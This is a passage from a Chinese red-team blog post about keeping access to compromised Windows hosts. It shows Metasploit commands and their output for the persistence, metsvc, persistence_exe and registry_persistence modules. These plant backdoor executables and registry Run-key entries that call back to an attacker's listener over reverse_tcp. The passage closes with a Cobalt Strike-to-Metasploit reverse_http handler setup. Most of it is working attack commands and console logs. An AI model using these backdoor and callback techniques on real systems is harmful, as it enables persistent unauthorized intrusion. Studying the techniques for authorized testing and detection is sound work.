</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 示例</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; run persistence -X -i <span style="color:#a6be9d">5</span> -p <span style="color:#a6be9d">4444</span> -r 192.168.81.160
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> Example: run post/windows/manage/persistence_exe <span style="color:#58a1dd">OPTION</span><span style="color:#ff636f">=</span>value <span style="color:#ff636f">[</span>...<span style="color:#ff636f">]</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Running Persistence Script
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Resource file <span style="color:#ff636f">for</span> cleanup created at /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.4235/SAUCERMAN_20190612.4235.rc
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Creating <span style="color:#58a1dd">Payload</span><span style="color:#ff636f">=</span>windows/meterpreter/reverse_tcp <span style="color:#58a1dd">LHOST</span><span style="color:#ff636f">=</span>192.168.81.160 <span style="color:#58a1dd">LPORT</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">4444</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Persistent agent script is <span style="color:#a6be9d">99630</span> bytes long
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Persistent Script written to C:<span style="color:#a6be9d">\U</span>sers<span style="color:#a6be9d">\T</span>ideSec<span style="color:#a6be9d">\A</span>ppData<span style="color:#a6be9d">\L</span>ocal<span style="color:#a6be9d">\T</span>emp<span style="color:#a6be9d">\q</span>exwcMF.vbs
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Executing script C:<span style="color:#a6be9d">\U</span>sers<span style="color:#a6be9d">\T</span>ideSec<span style="color:#a6be9d">\A</span>ppData<span style="color:#a6be9d">\L</span>ocal<span style="color:#a6be9d">\T</span>emp<span style="color:#a6be9d">\q</span>exwcMF.vbs
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Agent executed with PID <span style="color:#a6be9d">3540</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Installing into autorun as HKLM<span style="color:#a6be9d">\S</span>oftware<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\C</span>urrentVersion<span style="color:#a6be9d">\R</span>un<span style="color:#a6be9d">\q</span>rsXZuPqVbEgua
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Installed into autorun as HKLM<span style="color:#a6be9d">\S</span>oftware<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\C</span>urrentVersion<span style="color:#a6be9d">\R</span>un<span style="color:#a6be9d">\q</span>rsXZuPqVbEgua</span></span></code></pre></div><p>能实现同样功能的脚本还有：exploit/windows/local/persistence</p>
<p>2.metsvc服务后门</p>
<p>在C:\Users***\AppData\Local\Temp\目录下，上传一个vbs脚本 在注册表HKLM\Software\Microsoft\Windows\CurrentVersion\Run\加入开机启动项。<strong>通过服务启动，需要管理员权限，官方不推荐使用，运行失败</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>run metsvc –A   <span style="color:#828b96;font-style:italic">#自动安装后门</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 示例</span>
</span></span><span style="display:flex;"><span>meterpreter &gt; run metsvc –A
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>!<span style="color:#ff636f">]</span> Example: run post/windows/manage/persistence_exe <span style="color:#58a1dd">OPTION</span><span style="color:#ff636f">=</span>value <span style="color:#ff636f">[</span>...<span style="color:#ff636f">]</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Creating a meterpreter service on port <span style="color:#a6be9d">31337</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Creating a temporary installation directory C:<span style="color:#a6be9d">\U</span>sers<span style="color:#a6be9d">\T</span>ideSec<span style="color:#a6be9d">\A</span>ppData<span style="color:#a6be9d">\L</span>ocal<span style="color:#a6be9d">\T</span>emp<span style="color:#a6be9d">\i</span>InvhjKZbLH...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>  &gt;&gt; Uploading metsrv.x86.dll...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>  &gt;&gt; Uploading metsvc-server.exe...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span>  &gt;&gt; Uploading metsvc.exe...
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Starting the service...
</span></span><span style="display:flex;"><span>    Cannot open service manager <span style="color:#ff636f">(</span>0x00000005<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span>Listing: C:<span style="color:#a6be9d">\U</span>sers<span style="color:#a6be9d">\T</span>ideSec<span style="color:#a6be9d">\A</span>ppData<span style="color:#a6be9d">\L</span>ocal<span style="color:#a6be9d">\T</span>emp<span style="color:#a6be9d">\i</span>InvhjKZbLH
</span></span><span style="display:flex;"><span><span style="color:#ff636f">========================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode              Size    Type  Last modified              Name
</span></span><span style="display:flex;"><span>----              ----    ----  -------------              ----
</span></span><span style="display:flex;"><span>100666/rw-rw-rw-  <span style="color:#a6be9d">178688</span>  fil   2019-06-12 06:46:20 -0700  metsrv.dll
</span></span><span style="display:flex;"><span>100777/rwxrwxrwx  <span style="color:#a6be9d">45056</span>   fil   2019-06-12 06:46:21 -0700  metsvc-server.exe
</span></span><span style="display:flex;"><span>100777/rwxrwxrwx  <span style="color:#a6be9d">61440</span>   fil   2019-06-12 06:46:21 -0700  metsvc.exe</span></span></code></pre></div><p>三个文件上传成功，但服务没有启动起来，失败了。使用<code>-r</code>参数可卸载服务。</p>
<p>3.persistence_exe</p>
<p>再来看看官方推荐的东西吧</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; info post/windows/manage/persistence_exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       Name: Windows Manage Persistent EXE Payload Installer
</span></span><span style="display:flex;"><span>     Module: post/windows/manage/persistence_exe
</span></span><span style="display:flex;"><span>   Platform: Windows
</span></span><span style="display:flex;"><span>       Arch: 
</span></span><span style="display:flex;"><span>       Rank: Normal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Provided by:
</span></span><span style="display:flex;"><span>  Merlyn drforbin Cousins &lt;drforbin6@gmail.com&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Compatible session types:
</span></span><span style="display:flex;"><span>  Meterpreter
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Basic options:
</span></span><span style="display:flex;"><span>  Name      Current Setting  Required  Description
</span></span><span style="display:flex;"><span>  ----      ---------------  --------  -----------
</span></span><span style="display:flex;"><span>  REXENAME  default.exe      yes       The name to call exe on remote system
</span></span><span style="display:flex;"><span>  REXEPATH                   yes       The remote executable to upload and execute.
</span></span><span style="display:flex;"><span>  SESSION                    yes       The session to run this module on.
</span></span><span style="display:flex;"><span>  STARTUP   USER             yes       Startup <span style="color:#58a1dd">type</span> <span style="color:#ff636f">for</span> the persistent payload. <span style="color:#ff636f">(</span>Accepted: USER, SYSTEM, SERVICE<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Description:
</span></span><span style="display:flex;"><span>  This Module will upload an executable to a remote host and make it 
</span></span><span style="display:flex;"><span>  Persistent. It can be installed as USER, SYSTEM, or SERVICE. USER 
</span></span><span style="display:flex;"><span>  will start on user login, SYSTEM will start on system boot but 
</span></span><span style="display:flex;"><span>  requires privs. SERVICE will create a new service which will start 
</span></span><span style="display:flex;"><span>  the payload. Again requires privs.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Module options <span style="color:#ff636f">(</span>post/windows/manage/persistence_exe<span style="color:#ff636f">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   REXENAME  default.exe      yes       The name to call exe on remote system
</span></span><span style="display:flex;"><span>   REXEPATH                   yes       The remote executable to upload and execute.
</span></span><span style="display:flex;"><span>   SESSION                    yes       The session to run this module on.
</span></span><span style="display:flex;"><span>   STARTUP   USER             yes       Startup <span style="color:#58a1dd">type</span> <span style="color:#ff636f">for</span> the persistent payload. <span style="color:#ff636f">(</span>Accepted: USER, SYSTEM, SERVICE<span style="color:#ff636f">)</span></span></span></code></pre></div><p>此模块将可执行文件上载到远程主机并进行创建持久性。 涉及到四个参数</p>
<ul>
<li>REXENAME是拷贝到目标系统中的名字</li>
<li>EXEPATH是将要上传的后门在本地的位置</li>
<li>SESSION是选择运行此模块的会话</li>
<li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li>
</ul>
<p>尝试一下：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; run post/windows/manage/persistence_exe <span style="color:#58a1dd">REXENAME</span><span style="color:#ff636f">=</span>backdoor.exe <span style="color:#58a1dd">REXEPATH</span><span style="color:#ff636f">=</span>/home/ubuntu/shell.exe <span style="color:#58a1dd">STARTUP</span><span style="color:#ff636f">=</span>USER
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Running module against SAUCERMAN
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Reading Payload from file /home/ubuntu/shell.exe
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Persistent Script written to C:<span style="color:#a6be9d">\U</span>sers<span style="color:#a6be9d">\T</span>ideSec<span style="color:#a6be9d">\A</span>ppData<span style="color:#a6be9d">\L</span>ocal<span style="color:#a6be9d">\T</span>emp<span style="color:#a6be9d">\b</span>ackdoor.exe
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Executing script C:<span style="color:#a6be9d">\U</span>sers<span style="color:#a6be9d">\T</span>ideSec<span style="color:#a6be9d">\A</span>ppData<span style="color:#a6be9d">\L</span>ocal<span style="color:#a6be9d">\T</span>emp<span style="color:#a6be9d">\b</span>ackdoor.exe
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Agent executed with PID <span style="color:#a6be9d">3684</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Installing into autorun as HKCU<span style="color:#a6be9d">\S</span>oftware<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\C</span>urrentVersion<span style="color:#a6be9d">\R</span>un<span style="color:#a6be9d">\m</span>EMZDQOxkkeebI
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Installed into autorun as HKCU<span style="color:#a6be9d">\S</span>oftware<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\C</span>urrentVersion<span style="color:#a6be9d">\R</span>un<span style="color:#a6be9d">\m</span>EMZDQOxkkeebI
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</span></span></code></pre></div><p>4.registry_persistence</p>
<p>完整路径为exploit/windows/local/registry_persistence</p>
<p>和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; background
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Backgrounding session 13...
</span></span><span style="display:flex;"><span>msf5 auxiliary<span style="color:#ff636f">(</span>server/socks5<span style="color:#ff636f">)</span> &gt; use exploit/windows/local/registry_persistence
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/registry_persistence<span style="color:#ff636f">)</span> &gt; show options
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Module options <span style="color:#ff636f">(</span>exploit/windows/local/registry_persistence<span style="color:#ff636f">)</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Name           Current Setting  Required  Description
</span></span><span style="display:flex;"><span>   ----           ---------------  --------  -----------
</span></span><span style="display:flex;"><span>   BLOB_REG_KEY                    no        The registry key to use <span style="color:#ff636f">for</span> storing the payload blob. <span style="color:#ff636f">(</span>Default: random<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>   BLOB_REG_NAME                   no        The name to use <span style="color:#ff636f">for</span> storing the payload blob. <span style="color:#ff636f">(</span>Default: random<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>   CREATE_RC      <span style="color:#58a1dd">true</span>             no        Create a resource file <span style="color:#ff636f">for</span> cleanup
</span></span><span style="display:flex;"><span>   RUN_NAME                        no        The name to use <span style="color:#ff636f">for</span> the <span style="color:#a6be9d">&#39;Run&#39;</span> key. <span style="color:#ff636f">(</span>Default: random<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>   SESSION                         yes       The session to run this module on.
</span></span><span style="display:flex;"><span>   SLEEP_TIME     <span style="color:#a6be9d">0</span>                no        Amount of <span style="color:#58a1dd">time</span> to sleep <span style="color:#ff636f">(</span>in seconds<span style="color:#ff636f">)</span> before executing payload. <span style="color:#ff636f">(</span>Default: 0<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>   STARTUP        USER             yes       Startup <span style="color:#58a1dd">type</span> <span style="color:#ff636f">for</span> the persistent payload. <span style="color:#ff636f">(</span>Accepted: USER, SYSTEM<span style="color:#ff636f">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Exploit target:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   Id  Name
</span></span><span style="display:flex;"><span>   --  ----
</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">0</span>   Automatic
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/registry_persistence<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> SESSION <span style="color:#a6be9d">13</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">SESSION</span> <span style="color:#ff636f">=</span>&gt; <span style="color:#a6be9d">13</span>
</span></span><span style="display:flex;"><span>msf5 exploit<span style="color:#ff636f">(</span>windows/local/registry_persistence<span style="color:#ff636f">)</span> &gt; run
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Generating payload blob..
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Generated payload, <span style="color:#a6be9d">6048</span> bytes
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Root path is HKCU
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Installing payload blob..
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Created registry key HKCU<span style="color:#a6be9d">\S</span>oftware<span style="color:#a6be9d">\0</span>BaG3zDR
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Installed payload blob to HKCU<span style="color:#a6be9d">\S</span>oftware<span style="color:#a6be9d">\0</span>BaG3zDR<span style="color:#a6be9d">\i</span>iEB4InD
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Installing run key
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>+<span style="color:#ff636f">]</span> Installed run key HKCU<span style="color:#a6be9d">\S</span>oftware<span style="color:#a6be9d">\M</span>icrosoft<span style="color:#a6be9d">\W</span>indows<span style="color:#a6be9d">\C</span>urrentVersion<span style="color:#a6be9d">\R</span>un<span style="color:#a6be9d">\S</span>MPqA5kB
</span></span><span style="display:flex;"><span><span style="color:#ff636f">[</span>*<span style="color:#ff636f">]</span> Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span></span></code></pre></div><p>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。</p>
<h1 id="cs大全httpsbookshentoushitopmanualredteam_commandhtmlcs大全" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#cs%e5%a4%a7%e5%85%a8"target="_blank" rel="external nofollow noopener noreferrer">cs大全</a></span>
  <a href="#cs%e5%a4%a7%e5%85%a8httpsbookshentoushitopmanualredteam_commandhtmlcs%e5%a4%a7%e5%85%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>cs派生msf</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf &gt; use exploit/multi/handler 
</span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>handler<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> payload windows/meterpreter/reverse_http
</span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>handler<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> lhost 192.168.0.143
</span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>handler<span style="color:#ff636f">)</span> &gt; <span style="color:#58a1dd">set</span> lport <span style="color:#a6be9d">4444</span>
</span></span><span style="display:flex;"><span>msf exploit<span style="color:#ff636f">(</span>handler<span style="color:#ff636f">)</span> &gt; exploit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cs创建一个windows/foreign/reverse_http的 Listener
</span></span><span style="display:flex;"><span>然后选中对应机器，右键-&gt;Spawn，选择刚刚创建的监听器。</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%94%BB%E9%98%B2/" class="post-tag" title="Tags - 攻防">攻防</a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag" title="Tags - 内网渗透">内网渗透</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/63/" class="post-nav-item" rel="prev" title="反弹shell"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>反弹shell</a>
      <a href="/posts/owasp/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/109/" class="post-nav-item" rel="next" title="代码执行|命令执行">代码执行|命令执行<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
<a href="https://statcounter.com/p13160752/?guest=1" target="_blank">访问量统计</a> 

<script type="text/javascript">
var sc_project=13160779;
var sc_invisible=0;
var sc_security="f35eb178";
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" +
scJsHost +
"statcounter.com/counter/counter.js'></"+"script>");
</script>

<noscript>
  <div class="statcounter">
    <a title="web stats" href="https://statcounter.com/" target="_blank">
      <img referrerPolicy="no-referrer-when-downgrade">
    </a>
  </div>
</noscript>


    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
